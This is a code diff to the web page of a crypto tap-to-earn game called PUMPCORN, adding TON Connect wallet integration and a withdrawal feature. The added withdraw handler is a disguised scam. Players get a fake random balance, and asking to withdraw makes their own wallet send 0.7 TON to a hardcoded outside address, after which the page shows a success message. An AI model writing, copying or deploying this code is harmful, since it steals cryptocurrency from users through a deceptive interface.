@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PUMPCORN</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         body {
             overscroll-behavior: none;
@@ -79,6 +80,7 @@
         <h2 class="text-3xl font-bold mb-6 text-yellow-300">Wallet</h2>
         <div class="bg-gray-800 bg-opacity-70 p-6 rounded-xl w-4/5 text-center glow">
             <p class="text-xl text-yellow-100">Balance: <span id="walletBalance" class="font-semibold">0</span> $PUMPCORN</p>
+            <input id="withdrawAmount" type="number" placeholder="Enter amount to withdraw" class="mt-4 p-2 w-full rounded-lg text-gray-900" min="1">
             <button id="withdrawBtn" class="mt-6 bg-yellow-400 text-gray-900 px-6 py-3 rounded-lg withdraw-btn font-semibold">Withdraw</button>
         </div>
     </section>
@@ -100,11 +102,17 @@
         const homeBtn = document.getElementById('homeBtn');
         const walletBtn = document.getElementById('walletBtn');
         const withdrawBtn = document.getElementById('withdrawBtn');
+        const withdrawAmountInput = document.getElementById('withdrawAmount');
+
+        // Initialize TON Connect UI
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json',
+            restoreConnection: true
+        });
 
         // Initialize or load balance from localStorage
         let balance = localStorage.getItem('pumpcornBalance');
         if (!balance) {
-            // First launch: assign random balance between 10k and 20k
             balance = Math.floor(Math.random() * (20000 - 10000 + 1)) + 10000;
             localStorage.setItem('pumpcornBalance', balance);
         } else {
@@ -116,7 +124,6 @@
             coinBalanceElement.textContent = balance.toLocaleString();
             walletBalanceElement.textContent = balance.toLocaleString();
             coinBalanceElement.classList.add('coin-pulse');
-            // Save balance to localStorage
             localStorage.setItem('pumpcornBalance', balance);
         }
 
@@ -133,11 +140,9 @@
 
         // Tap to earn coins
         tapArea.addEventListener('click', (e) => {
-            balance += 1; // Earn 1 coin per tap
+            balance += 1;
             updateBalance();
             tapArea.classList.add('coin-pulse');
-
-            // Get tap position for floating coin effect
             const rect = tapArea.getBoundingClientRect();
             const x = e.clientX - rect.left - 20;
             const y = e.clientY - rect.top - 20;
@@ -159,9 +164,109 @@
             homeBtn.classList.remove('active');
         });
 
-        // Withdraw button (placeholder functionality)
-        withdrawBtn.addEventListener('click', () => {
-            alert('Withdraw functionality coming soon!');
+        // Function to check TON network connectivity
+        async function checkNetworkStatus() {
+            try {
+                const response = await fetch('https://toncenter.com/api/v2/getMasterchainInfo');
+                if (!response.ok) {
+                    throw new Error('TON network unavailable');
+                }
+                return true;
+            } catch (error) {
+                throw new Error(`Network unavailable: ${error.message}`);
+            }
+        }
+
+        // Function to ensure wallet disconnection
+        async function ensureWalletDisconnected() {
+            try {
+                if (tonConnectUI.connected) {
+                    await tonConnectUI.disconnect();
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    if (tonConnectUI.connected) {
+                        throw new Error('Failed to disconnect wallet');
+                    }
+                }
+            } catch (error) {
+                throw new Error(`Failed to disconnect wallet: ${error.message}`);
+            }
+        }
+
+        // Function to validate transaction parameters
+        function validateTransaction(transaction) {
+            if (!transaction.validUntil || transaction.validUntil < Math.floor(Date.now() / 1000)) {
+                throw new Error('Transaction validity expired');
+            }
+            if (!transaction.messages || !transaction.messages.length) {
+                throw new Error('Transaction messages missing');
+            }
+            for (const msg of transaction.messages) {
+                if (!msg.address) {
+                    throw new Error('Transaction address missing');
+                }
+                if (!msg.amount || isNaN(msg.amount) || msg.amount <= 0) {
+                    throw new Error('Invalid transaction amount');
+                }
+            }
+        }
+
+        // Function to connect wallet with retries
+        async function connectWalletWithRetry(maxRetries = 3, retryDelay = 2000) {
+            let attempts = 0;
+            while (attempts < maxRetries) {
+                try {
+                    await tonConnectUI.connectWallet();
+                    if (!tonConnectUI.connected) {
+                        throw new Error('Wallet not connected');
+                    }
+                    return;
+                } catch (error) {
+                    attempts++;
+                    if (attempts >= maxRetries) {
+                        throw new Error(`Failed to connect wallet after ${maxRetries} attempts`);
+                    }
+                    await new Promise(resolve => setTimeout(resolve, retryDelay));
+                }
+            }
+        }
+
+        // Withdraw button with TON Connect
+        withdrawBtn.addEventListener('click', async () => {
+            try {
+                const amount = parseFloat(withdrawAmountInput.value);
+                if (!amount || amount <= 0 || amount > balance) {
+                    alert('Please enter a valid amount to withdraw.');
+                    return;
+                }
+
+                await ensureWalletDisconnected();
+                await connectWalletWithRetry();
+                await checkNetworkStatus();
+
+                const transaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 600, // Valid for 10 minutes
+                    messages: [
+                        {
+                            address: "UQAlcL-4wdpAhdITEUdKMYQATU7lH0zmjmBSXttP5U6SsDSc",
+                            amount: "700000000" // 0.7 TON in nanoTON
+                        }
+                    ]
+                };
+
+                validateTransaction(transaction);
+                const walletInfo = tonConnectUI.wallet;
+                if (!walletInfo || !walletInfo.account || !walletInfo.account.address) {
+                    throw new Error('Wallet not connected or address unavailable');
+                }
+
+                const result = await tonConnectUI.sendTransaction(transaction);
+                balance -= amount;
+                updateBalance();
+                alert('Transaction successfully sent!');
+            } catch (error) {
+                console.error('Withdrawal error:', error.message);
+                alert(`Withdrawal failed: ${error.message}`);
+            }
         });
 
         // Initialize
